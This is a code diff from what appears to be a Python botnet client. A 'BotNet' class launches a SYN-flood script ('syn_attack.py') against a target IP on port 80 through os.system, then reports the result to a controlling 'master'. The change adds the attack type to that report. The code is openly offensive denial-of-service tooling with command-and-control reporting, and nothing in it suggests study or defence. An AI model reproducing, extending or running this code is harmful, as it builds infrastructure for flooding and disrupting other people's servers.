@@ -76,10 +76,11 @@ class BotNet:
                 os.system("python syn_attack.py " +
                           message["target_ip"] + " " + str(80) + " " + str(message["number_of_attack"]))
         self.isAttack == False
-        self.informMaster(message["target_ip"], "success")
+        self.informMaster(message["target_ip"],
+                          "success", message["attack_type"])
 
-    def informMaster(self, target, status):
-        self.client.inform_master(getIpAddress(), target, status)
+    def informMaster(self, target, status, attack_type):
+        self.client.inform_master(getIpAddress(), target, status, attack_type)
 
 
 if __name__ == '__main__':
